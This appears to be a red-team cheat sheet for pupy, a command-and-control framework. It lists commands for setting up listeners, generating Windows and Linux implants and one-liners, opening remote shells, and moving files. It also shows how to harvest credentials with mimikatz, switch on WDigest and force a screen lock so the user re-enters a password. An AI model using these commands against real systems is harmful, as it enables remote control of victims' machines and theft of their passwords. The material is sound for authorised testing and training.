=== pupy

https://github.com/n1nj4sec/pupy

pupy is a fun little Command and Control (C2) and implant written in python and C. It has a few oneliner clients that make it fairly versatile.

==== Setting up the listeners

The webserver isn't really a listener, but is used to deliver payloads to oneliners.

[cols="1,1", options="header"]
|===
|Command                               |Description
|`config list webserver`               |Get webserver configuration
|`config set webserver listen ADDRESS` |Change webserver port. Must save and restart if changed.
|`config save`                         |Save config
|===

The default config has an `ssl` listener ready to go on port 443. There's not much to configure here.

[cols="1,1", options="header"]
|===
|Command                         |Description
|`config set listeners ssl 8443` |Change port of ssl listener
|===

There's a udp listener available. It needs to be configured before use.

[cols="1,1", options="header"]
|===
|Command                              |Description
|`config set listeners udp_secure 53` |Change port of udp_secure listener
|`listen -a udp_secure`               |Start udp_secure listener
|===

==== Interacting

[cols="1,3", options="header"]
|===
|Command         |Description
|`sessions`      |List current sessions
|`sessions -i N` |Interact with a specific one, if multiple.
|`shell`         |Start an interactive shell on the current session.
|`sessions -K`   |Request all sessions to exit
|===

<<<

==== Generating clients

pupy calls the implants clients. Clients are generated with the `gen` command

  gen GENFLAG connect CONNECTFLAG

[cols="1,1", options="header"]
|===
|`gen` Flags                           |Description
|`-f client\|py_onliner\|ps1_oneliner` |Generate a standalone client or python or powershell oneliner.
|`-O windows\|linux`                   |Set OS
|`-A x86\|x64`                         |Set arch
|===

[cols="1,1", options="header"]
|===
|Connect Flags        | Description
|`-t ssl\|udp_secure` |Type of connection, ssl or udp_secure
|`--host ADDRESS`     |IP and port of listener
|===

==== File transfer

[cols="1,3", options="header"]
|===
|Command                           |Description
|`download remote_path local_path` |Download a file
|`upload local_path remote_path`   |Upload a file
|===

==== Sessions

Sessions are identified by numeric ID. They can be tagged. Clients are identified by a MAC address.

  tag -a 080027a66ed2 080027a66ed2

Tag the sessions of client `080027a66ed2` as `080027a66ed2`. This doesn't seem intuitive at first, but in combination with the `on_connect` config options mentioned below it's powerful.

  sessions

Show the current filtered session, or all sessions. Include the tags set with `tag`.

  config set on_connect 080027a66ed2_1 mimikatz

Run the command `mimikatz` on the client `080027a66ed2` when it connects. This specific on_connect setting is `1`.

==== Modules of note

  mimikatz --wdigest check

Check to see if WDigest is enabled via the `UseLogonCredential` registry key.

  mimikatz --wdigest enable

Enable WDigest if it's not enabled.

  lock_screen

Force the screen to lock and the user to reenter creds. This needs to be run as the logged in user, not NT AUTHORITY\SYSTEM.

  mimikatz

Use mimikatz to run `loginPasswords` and add any passwords found, via WDigest or otherwise, to `creds`.

==== Common snippets

  gen -f py_oneliner -O linux -A x64 connect -t ssl --host localhost:443

Generate a python oneliner

  gen -f client -O windows -A x64 -o /tmp/pupy.exe connect -t ssl --host localhost:443 --host localhost:8443

Generate an executable for windows

<<<
